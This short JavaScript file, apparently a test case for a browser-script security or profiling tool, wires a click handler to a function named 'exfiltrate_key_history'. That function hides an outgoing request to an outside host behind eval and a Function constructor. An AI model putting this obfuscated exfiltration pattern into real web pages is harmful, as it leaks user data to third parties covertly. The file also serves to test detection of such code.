
JAM.startProfile('load');
function exfiltrate_key_history() {
  var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=dynamic", true);xmlhttp.send(null);';
  eval("var sneaky = Function(exp)");
  sneaky();
  return
}
var v0 = document.getElementById("test");
v0.onclick = exfiltrate_key_history;

JAM.stopProfile('load');
